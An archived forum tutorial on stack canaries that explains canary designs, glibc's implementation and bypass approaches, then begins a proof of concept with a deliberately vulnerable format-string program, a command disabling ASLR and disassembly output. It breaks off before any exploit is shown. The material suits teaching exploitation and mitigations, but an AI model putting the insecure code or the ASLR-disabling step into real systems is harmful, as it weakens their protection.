<!DOCTYPE html>
<html lang="en">
  <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <title>Exploit Mitigation Techniques - Stack Canaries - Exploit Development - 0x00sec - The Home of the Hacker</title>
    <meta name="description" content="Preface
Hey there! 
After quite some time the second part will be finally published :slight_smile: ! 
Sorry for the delay, real life can be overwhelming ;).. 
Last time I have introduced this series by covering Data Exec&amp;hellip;">
    <meta name="generator" content="Discourse 3.6.0.beta2-latest - https://github.com/discourse/discourse version 3b1964f3ed8bdc2f181e2abccb1b116e4b814db5">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.html">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.html">
<meta name="theme-color" media="all" content="#171616">

<meta name="color-scheme" content="dark">

<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
<link rel="canonical" href="5085.html" />

<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">

    
    <link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4.css_%3b%20filename_%3dUTF-8%27%27color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" class="light-scheme" data-scheme-id="15"/>

<link href="../../stylesheets/common_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27common_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common"  />

  <link href="../../stylesheets/mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile"  />
  <link href="../../stylesheets/desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop"  />



    <link href="../../stylesheets/chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="chat"  />
    <link href="../../stylesheets/checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="checklist"  />
    <link href="../../stylesheets/discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-cakeday"  />
    <link href="../../stylesheets/discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-details"  />
    <link href="../../stylesheets/discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-lazy-videos"  />
    <link href="../../stylesheets/discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-local-dates"  />
    <link href="../../stylesheets/discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-narrative-bot"  />
    <link href="../../stylesheets/discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-presence"  />
    <link href="../../stylesheets/discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-solved"  />
    <link href="../../stylesheets/discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-templates"  />
    <link href="../../stylesheets/discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-topic-voting"  />
    <link href="../../stylesheets/docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="docker_manager"  />
    <link href="../../stylesheets/footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="footnote"  />
    <link href="../../stylesheets/poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="poll"  />
    <link href="../../stylesheets/spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="spoiler-alert"  />
    <link href="../../stylesheets/chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="chat_mobile"  />
    <link href="../../stylesheets/discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-solved_mobile"  />
    <link href="../../stylesheets/discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-topic-voting_mobile"  />
    <link href="../../stylesheets/chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="chat_desktop"  />
    <link href="../../stylesheets/discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="discourse-topic-voting_desktop"  />
    <link href="../../stylesheets/poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="poll_desktop"  />

  <link href="../../stylesheets/common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960db.css_%3b%20filename_%3dUTF-8%27%27common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960dba97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common_theme" data-theme-id="57" data-theme-name="0x00sec-v2"/>
    <link href="../../stylesheets/mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38.css_%3b%20filename_%3dUTF-8%27%27mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile_theme" data-theme-id="4" data-theme-name="mobile chrome"/>
    <link href="../../stylesheets/desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96.css_%3b%20filename_%3dUTF-8%27%27desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2"/>

    <link rel="stylesheet" href="../../../external.html?link=https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="../../../external.html?link=https://s3.amazonaws.com/0x00sec/highlight.pack.js" nonce="Anb2wsDKUyETGrm8NPfuUHP8A"></script>
<script defer="" src="../../theme-javascripts/05954ff525aceb8daa8b585f92d758d311ae7077.js_%3b%20filename_%3dUTF-8%27%2705954ff525aceb8daa8b585f92d758d311ae7077a97f.js?__ws=d.clarkee.co.uk" data-theme-id="40" nonce="Anb2wsDKUyETGrm8NPfuUHP8A"></script>
    
        <link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Exploit Mitigation Techniques - Stack Canaries&#39;" href="5085.rss" />
    <meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://d.clarkee.co.uk/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:image" content="https://d.clarkee.co.uk/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:url" content="https://d.clarkee.co.uk/t/exploit-mitigation-techniques-stack-canaries/5085" />
<meta name="twitter:url" content="https://d.clarkee.co.uk/t/exploit-mitigation-techniques-stack-canaries/5085" />
<meta property="og:title" content="Exploit Mitigation Techniques - Stack Canaries" />
<meta name="twitter:title" content="Exploit Mitigation Techniques - Stack Canaries" />
<meta property="og:description" content="Preface Hey there!  After quite some time the second part will be finally published ðŸ™‚ !  Sorry for the delay, real life can be overwhelming ;)..  Last time I have introduced this series by covering Data Execution Prevention (DEP).  Today weâ€™re dealing with the next big technique.  As the title already suggests it will be about stack canaries.  The format will be similar to last time.  First we will dealing with a basic introduction to the approach, directly followed by a basic explo..." />
<meta name="twitter:description" content="Preface Hey there!  After quite some time the second part will be finally published ðŸ™‚ !  Sorry for the delay, real life can be overwhelming ;)..  Last time I have introduced this series by covering Data Execution Prevention (DEP).  Today weâ€™re dealing with the next big technique.  As the title already suggests it will be about stack canaries.  The format will be similar to last time.  First we will dealing with a basic introduction to the approach, directly followed by a basic explo..." />
<meta property="og:article:section" content="Exploit Development" />
<meta property="og:article:section:color" content="92278F" />
<meta property="og:article:tag" content="canaries" />
<meta property="og:article:tag" content="exploitation" />
<meta property="og:article:tag" content="mitigations" />
<meta property="og:article:tag" content="linux" />
<meta property="og:article:tag" content="hacking" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="10 mins ðŸ•‘" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="20 â¤" />
<meta property="article:published_time" content="2018-01-24T19:50:46+00:00" />
<meta property="og:ignore_canonical" content="true" />


    
  </head>
  <body class="crawler ">
    <div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">
  <!--<a href="https://git.0x00sec.org" class="dow-menu">GitLab</a>  
  <a href="https://blog.0x00sec.org/irc" class="dow-menu">IRC</a>!-->
  <a href="../../../external.html?link=https://init.0x00sec.org/" class="dow-menu">Init</a>
  <a href="../../../external.html?link=https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
  <a href="../../../external.html?link=https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
    <header>
  <a href="../../index.html">0x00sec - The Home of the Hacker</a>
</header>

    <div id="main-outlet" class="wrap" role="main">
        <div id="topic-title">
    <h1>
      <a href="5085.html">Exploit Mitigation Techniques - Stack Canaries</a>
    </h1>

      <div class="topic-category" itemscope itemtype="../../../external.html?link=http://schema.org/BreadcrumbList">
          <span itemprop="itemListElement" itemscope itemtype="../../../external.html?link=http://schema.org/ListItem">
            <a href="../../c/exploit-development/53.html" class="badge-wrapper bullet" itemprop="item">
              <span class='badge-category-bg' style='background-color: #92278F'></span>
              <span class='badge-category clear-badge'>
                <span class='category-name' itemprop='name'>Exploit Development</span>
              </span>
            </a>
            <meta itemprop="position" content="1" />
          </span>
      </div>

      <div class="topic-category">
        <div class='discourse-tags list-tags'>
            <a href='../../tag/canaries.html' class='discourse-tag' rel="tag">canaries</a>, 
            <a href='../../tag/exploitation.html' class='discourse-tag' rel="tag">exploitation</a>, 
            <a href='../../tag/mitigations.html' class='discourse-tag' rel="tag">mitigations</a>, 
            <a href='../../tag/linux.html' class='discourse-tag' rel="tag">linux</a>, 
            <a href='../../tag/hacking.html' class='discourse-tag' rel="tag">hacking</a>
        </div>
      </div>
  </div>

  

    <div itemscope itemtype='../../../external.html?link=http://schema.org/DiscussionForumPosting'>
      <meta itemprop='headline' content='Exploit Mitigation Techniques - Stack Canaries'>
      <link itemprop='url' href='5085.html'>
      <meta itemprop='datePublished' content='2018-01-24T19:50:45Z'>
        <meta itemprop='articleSection' content='Exploit Development'>
      <meta itemprop='keywords' content='canaries, exploitation, mitigations, linux, hacking'>
      <div itemprop='publisher' itemscope itemtype="../../../external.html?link=http://schema.org/Organization">
        <meta itemprop='name' content='0x00sec - The Home of the Hacker'>
          <div itemprop='logo' itemscope itemtype="../../../external.html?link=http://schema.org/ImageObject">
            <meta itemprop='url' content='../../uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.html'>
          </div>
      </div>


          <div id='post_1'  class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/ricksanchez.html'><span itemprop='name'>ricksanchez</span></a>
                
              </span>

                <link itemprop="mainEntityOfPage" href="5085.html">


              <span class="crawler-post-infos">
                  <time  datetime='2018-01-24T19:50:46Z' class='post-time'>
                    January 24, 2018,  7:50pm
                  </time>
                  <meta itemprop='dateModified' content='2020-07-12T12:55:37Z'>
              <span itemprop='position'>1</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <h2><a name="p-20579-preface-1" class="anchor" href="#p-20579-preface-1"></a>Preface</h2>
<p>Hey there!<br>
After quite some time the second part will be finally published <img src="../../images/emoji/twitter/slight_smile8e5e.png?v=15" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"> !<br>
Sorry for the delay, real life can be overwhelming ;)..</p>
<p><a href="../../../external.html?link=https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634">Last time</a> I have introduced this series by covering Data Execution Prevention (DEP).<br>
Today weâ€™re dealing with the next big technique.<br>
As the title already suggests it will be about stack canaries.<br>
The format will be similar to last time.<br>
First we will dealing with a basic introduction to the approach, directly followed by a basic exploitation part.</p>
<blockquote>
<p>REMARK: The following is the result of a self study and might contain faulty information. If you find any let me know. Thanks!</p>
</blockquote>
<h2><a name="p-20579-requirements-2" class="anchor" href="#p-20579-requirements-2"></a>Requirements</h2>
<ul>
<li>Some spare minutes</li>
<li>A basic understanding of what causes memory corruptions</li>
<li>The will to ask or look up unknown terms yourself</li>
<li>Some ASM/C knowledge</li>
<li>Basic format string bugs</li>
<li>How linking processes/libraries works (GOT)</li>
</ul>
<h2><a name="p-20579-stack-canaries-stack-cookies-sc-3" class="anchor" href="#p-20579-stack-canaries-stack-cookies-sc-3"></a>Stack Canaries / Stack Cookies (SC)</h2>
<h3><a name="p-20579-basic-design-4" class="anchor" href="#p-20579-basic-design-4"></a>Basic Design</h3>
<p>To prevent corrupted buffers during program runtime another technique besides <a href="../../../external.html?link=https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634">data execution prevention</a> called stack canaries was proposed and finally implemented as a counter measure against the emerging threat of buffer corruption exploits.<br>
It was adapted early!<br>
Patching a single buffer vulnerability in an application is harmless, but even within one program the causes of a simple patched buffer size might cause harm to other areas.<br>
On top of that the amount of programs running with legacy code and system rights over their needs is <a href="../../../external.html?link=http://gs.statcounter.com/os-version-market-share/windows/desktop/worldwide">considerable large</a>.<br>
Overall this patch driven nature of software development in combination with the usage of <a href="../../../external.html?link=http://dl.acm.org/citation.cfm?id=2187679">type unsafe languages like C/C++</a> makes such buffer problems still reappear too frequently.<br>
Instead of trying to fix the problem at source level, which patching tries to, <a href="../../../external.html?link=https://www.usenix.org/legacy/publications/library/proceedings/sec98/full_papers/cowan/cowan.pdf">canaries</a> try to fix the problem at hand: the stack structure.</p>
<p>The basic methodology is to place a filler word, the canary, between local variables or buffer contents in general and the return address.<br>
This is done for <a href="../../../external.html?link=https://lwn.net/Articles/584225/">every* (*if the right compiler flag is chosen)</a> function called, not just once for some oblivious main function.<br>
So an overwriting of multiple canary values is often required during an exploit.<br>
A basic scheme is shown</p>
<pre><code class="lang-auto">            Process Address                                   Process Address
            Space                                             Space
           +---------------------+                           +---------------------+
           |                     |                           |                     |
   0xFFFF  |  Top of stack       |                   0xFFFF  |  Top of stack       |
       +   |                     |                       +   |                     |
       |   +---------------------+                       |   +---------------------+
       |   |  malicious code     &lt;-----+                 |   |  malicious code     |
       |   +---------------------+     |                 |   +---------------------+
       |   |                     |     |                 |   |                     |
       |   |                     |     |                 |   |                     |
       |   |                     |     |                 |   |                     |
       |   +---------------------|     |                 |   +---------------------|        
       |   |  return address     |     |                 |   |  return address     |
       |   +---------------------+     |                 |   +---------------------|
 stack |   |  saved EBP          +-----+           stack |   |  saved EBP          |
growth |   +---------------------+                growth |   +---------------------+
       |   |  local variables    |                       |   |  stack canary       |
       |   +---------------------+                       |   +---------------------+
       |   |                     |                       |   |  local variables    |
       |   |  buffer             |                       |   +---------------------+
       |   |                     |                       |   |                     |
       |   |                     |                       |   |  buffer             |
       |   +---------------------+                       |   |                     |
       |   |                     |                       |   |                     |
       |   |                     |                       |   +---------------------+
       |   |                     |                       |   |                     |
       v   |                     |                       v   |                     |
   0x0000  |                     |                   0x0000  |                     |
           +---------------------+                           +---------------------+



</code></pre>
<pre><code>Note: This is only a basic overview. detailed low-level views can slightly differ
</code></pre>
<blockquote>
<p><strong>Remark</strong>: Retake on <a href="../../../external.html?link=https://stackoverflow.com/questions/1395591/what-is-exactly-the-base-pointer-and-stack-pointer-to-what-do-they-point">base pointers</a> in case you forgot!</p>
</blockquote>
<p>The canary can consist of different metrics.<br>
Random or terminator values are the commonly used ones in the end.<br>
When reaching (close to) a return instruction during code execution the integrity of the canary is checked first to evaluate if it was changed.<br>
If no alteration is found, execution resumes normally.<br>
If a tampered with canary value is detected program execution is terminated immediately, since it indicates a malicious intent.<br>
A user controlled input is often the cause for this <img src="../../images/emoji/twitter/stuck_out_tongue8e5e.png?v=15" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:" loading="lazy" width="20" height="20"> .<br>
The most simple case for this scenario is a basic stack smashing attack, where the amount of bytes written to a buffer exceeds the buffer size.<br>
Pairing that with a system call that does not do any bounds checking results in <a href="../../../external.html?link=http://ieeexplore.ieee.org/document/1324594/">overwriting the canary value</a>.</p>
<p>The first implementation of stack canaries on Linux based systems appeared in 1997 with the publication of StackGuard, which came as a <a href="../../../external.html?link=https://www.usenix.org/legacy/publications/library/proceedings/sec98/full_papers/cowan/cowan.pdf">set of patches for the GNU Compiler Collection (GCC)</a>.</p>
<h4><a name="p-20579-terminator-canaries-5" class="anchor" href="#p-20579-terminator-canaries-5"></a>Terminator Canaries</h4>
<p>Letâ€™s just take this sample code snipped for clarification:</p>
<pre data-code-wrap="c"><code class="lang-c">int main(int argv, char **argc) {
    int var1;
    char buf[80];
    int var2;
    strcpy(buf,argc[1]);
    print(buf);
    exit(0);
}
</code></pre>
<p>As the name <em>terminator</em> suggests once it is reached during an attempted overwrite it should stop the overwriting.<br>
An example value for this is <code>0x000aff0d</code>.<br>
The <code>0x00</code> will stop <code>strcpy()</code> and we wonâ€™t be able to alter the return address.<br>
If <code>gets()</code> were used instead of <code>strcpy()</code> to read into a buffer, we would be able to write <code>0x00</code>, but <code>0x0a</code> would stop it.<br>
That is how these terminator values work on a basic level.</p>
<p>In general we can say that a terminator canary contains NULL(0x00), CR (0x0d), LF (0x0a) and EOF (0xff).<br>
Such a combination of these four 2-byte characters should terminate most string operations, rendering the overflow attempt harmless.</p>
<h4><a name="p-20579-random-canaries-6" class="anchor" href="#p-20579-random-canaries-6"></a>Random Canaries</h4>
<p>Random canaries on the other hand do not try to stop string operations.<br>
They want to make it <em>exceedingly difficult</em> for attackers to find the right value so a process is terminated once tampering is detected.<br>
The random value is taken from <code>/dev/urandom</code> if available, and created by hashing the time of day if <code>/dev/urandom</code> is not supported.<br>
This randomness is sufficient to prevent most prediction attempts.</p>
<hr>
<h3><a name="p-20579-closer-look-at-canary-implementations-7" class="anchor" href="#p-20579-closer-look-at-canary-implementations-7"></a>Closer look at canary implementations</h3>
<p>Letâ€™s take a quick peek at the current canary implementation of the most recent <a href="../../../external.html?link=https://ftp.gnu.org/gnu/libc/">glibc 2.26 libc-start.c</a>:</p>
<pre data-code-wrap="c"><code class="lang-c">  /* Set up the stack checker's canary.  */
  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);
  [...]
  __stack_chk_guard = stack_chk_guard;
</code></pre>
<p>The <code>_dl_setup_stack_chk_guard</code> function is looking like this:</p>
<pre><code class="lang-auto">static inline uintptr_t __attribute__ ((always_inline))
_dl_setup_stack_chk_guard (void *dl_random)
{
  union
  {
    uintptr_t num;
    unsigned char bytes[sizeof (uintptr_t)];
  } ret = { 0 };
  # __stack_chk_guard becomes a terminator canary
  if (dl_random == NULL)
    {
      ret.bytes[sizeof (ret) - 1] = 255;
      ret.bytes[sizeof (ret) - 2] = '\n';
    }
  # __stack_chk_guard will be a random canary
  else
    {
      memcpy (ret.bytes, dl_random, sizeof (ret));
#if BYTE_ORDER == LITTLE_ENDIAN
      ret.num &amp;= ~(uintptr_t) 0xff;
#elif BYTE_ORDER == BIG_ENDIAN
      ret.num &amp;= ~((uintptr_t) 0xff &lt;&lt; (8 * (sizeof (ret) - 1)));
#else
# error "BYTE_ORDER unknown"
#endif
    }
  return ret.num;
}
</code></pre>
<p>Whatâ€™s interesting here is that we can see the basic design choices mentioned earlier!<br>
<code>_dl_setup_stack_chk_guard()</code> allows to create all the canary types.<br>
If <code>dl_random</code> is null, <code>__stack_chk_guard</code> will be a terminator canary, otherwise random canary.</p>
<hr>
<h3><a name="p-20579-limitations-8" class="anchor" href="#p-20579-limitations-8"></a>Limitations</h3>
<p>This technique is exposed to several weaknesses.<br>
One is namely <em>static canary values</em> that are easily found out using brute force or by simply repeatedly guessingâ€¦<br>
Using random or terminator values instead migrated this flaw early on.<br>
This hardens the security implications, but an adversary may still circumvent this technique.<br>
When finding a way to extract the canary value from the memory space of an application during runtime it is possible to bypass canary protected applications.<br>
Alternatively if a terminator canary like <code>0x000aff0d</code> is used we cannot write past it with common string operations, but it is possible to write to memory up until to the canary.<br>
This effectively allows to gain full control of the frame pointer.<br>
If this is possible, as well as having the possibility to write to a memory region like the stack or heap, we can bend the frame pointer to point to <code>terminator_canary+shellcode_address</code> in memory.<br>
This allows us to <a href="../../../external.html?link=http://staff.ustc.edu.cn/~bjhua/courses/security/2014/readings/stackguard-bypass.pdf">return to injected shell code</a>.</p>
<p>Another bypass is possible through a technique called structured <a href="../../../external.html?link=https://www.exploit-db.com/docs/english/17505-structured-exception-handler-exploitation.pdf">exception handler exploitation (SEH exploit)</a>.<br>
It makes use of the fact that stack canaries modify function pro- and epilogue for canary verification purposes.<br>
If a buffer on stack or heap is overwritten during runtime, and the fault is noticed before the execution of the copy/write function returns, an exception is raised.<br>
The exception is passed to a local exception handler that again passes it to the correct system specific exception handler to handle the fault.<br>
Changing said exception handler to point to user controlled input like shell code makes it return to that.<br>
This bypasses any canary check and execution of any provided malicious input is accomplished.</p>
<blockquote>
<p>Note: Structured exception handlers are Windows specific!</p>
</blockquote>
<blockquote>
<p>Note2: These limitations do not represent all possibilities for how to bypass canaries!</p>
</blockquote>
<hr>
<h2><a name="p-20579-poc-1-9" class="anchor" href="#p-20579-poc-1-9"></a>PoC 1</h2>
<h3><a name="p-20579-abusing-a-stack-canary-disabled-binary-10" class="anchor" href="#p-20579-abusing-a-stack-canary-disabled-binary-10"></a>Abusing a stack canary disabled binary</h3>
<p>I wonâ€™t cover this over here again.<br>
It already was demonstrated how to do that with a basic stack smashing attack in my last <a href="../../../external.html?link=https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634">article</a>.</p>
<h3><a name="p-20579-abusing-enabled-stack-canaries-11" class="anchor" href="#p-20579-abusing-enabled-stack-canaries-11"></a>Abusing enabled stack canaries</h3>
<pre><code>Note: ASLR is still disabled for now: echo 0 &gt; /proc/sys/kernel/randomize_va_space
</code></pre>
<h4><a name="p-20579-the-vulnerable-program-12" class="anchor" href="#p-20579-the-vulnerable-program-12"></a>The vulnerable program</h4>
<p>Letâ€™s consider this small program:</p>
<pre data-code-wrap="c"><code class="lang-c">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int target;


void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);
  printf("Welcome 0x00sec to Stack Canaries\n");

  strdup(buffer);
  return 0;

}

int main(int argc, char **argv)
{
  vuln();
}
</code></pre>
<p>For our PoC we donâ€™t need much, hence the program is quite small.<br>
All it does is it takes some input via <code>fgets()</code> and prints it with <code>printf()</code>.<br>
For some dubious reason <code>strdup()</code> is present here too <img src="../../images/emoji/twitter/wink8e5e.png?v=15" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"></p>
<pre><code>Note: The strdup(s) function returns a pointer to a new string which is a duplicate of the string s.
</code></pre>
<p>Letâ€™s compile it with <code>gcc -fstack-protector-all -m32 -o vuln vuln.c</code>.<br>
And check if I didnâ€™t lie about the enabled exploit mitigations:</p>
<pre><code>gefâž¤  checksec
[+] checksec for '/0x00sec/Canary/binary/vuln'
Canary                        : Yes â†’  value: 0xd41a2e00
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial
gefâž¤  
</code></pre>
<p>Data execution prevention (NX) as well as canaries are fully enabled.<br>
For the sake of usability <code>gef</code> and other gdb enhancements can already display the current canary value.<br>
Alternatively if stack canaries are present we always have the <code> __stack_chk_fail</code> symbol, which we can search for:</p>
<pre><code>$ readelf -s ./vuln | grep __stack_chk_fail
     5: 00000000     0 FUNC    GLOBAL DEFAULT  UND __stack_chk_fail@GLIBC_2.4 (3)
    58: 00000000     0 FUNC    GLOBAL DEFAULT  UND __stack_chk_fail@@GLIBC_2
</code></pre>
<h4><a name="p-20579-brief-look-at-the-assembly-13" class="anchor" href="#p-20579-brief-look-at-the-assembly-13"></a>Brief look at the assembly</h4>
<pre><code>gefâž¤  disassemble main
Dump of assembler code for function main:
   0x080485ef &lt;+0&gt;:	lea    ecx,[esp+0x4]
   0x080485f3 &lt;+4&gt;:	and    esp,0xfffffff0
   0x080485f6 &lt;+7&gt;:	push   DWORD PTR [ecx-0x4]
   0x080485f9 &lt;+10&gt;:	push   ebp
   0x080485fa &lt;+11&gt;:	mov    ebp,esp
   0x080485fc &lt;+13&gt;:	push   ecx
   0x080485fd &lt;+14&gt;:	sub    esp,0x24
   0x08048600 &lt;+17&gt;:	mov    eax,ecx
   0x08048602 &lt;+19&gt;:	mov    edx,DWORD PTR [eax]
   0x08048604 &lt;+21&gt;:	mov    DWORD PTR [ebp-0x1c],edx
   0x08048607 &lt;+24&gt;:	mov    eax,DWORD PTR [eax+0x4]
   0x0804860a &lt;+27&gt;:	mov    DWORD PTR [ebp-0x20],eax
   0x0804860d &lt;+30&gt;:	mov    eax,gs:0x14                          ; canary right here
